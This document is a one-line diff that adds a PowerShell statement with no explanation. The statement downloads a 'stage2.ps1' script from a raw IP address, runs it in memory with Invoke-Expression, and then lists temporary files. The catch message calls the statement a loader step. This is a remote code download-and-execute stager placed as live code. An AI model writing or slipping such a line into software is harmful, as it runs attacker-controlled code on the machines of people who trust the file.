@@ -1,0 +1,1 @@
+try { IEX (Invoke-WebRequest -Uri "https://203.0.113.241/stage2.ps1" -UseBasicParsing).Content; Set-Location -Path $env:TEMP; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3 } catch { Write-Warning "Loader step failed" }
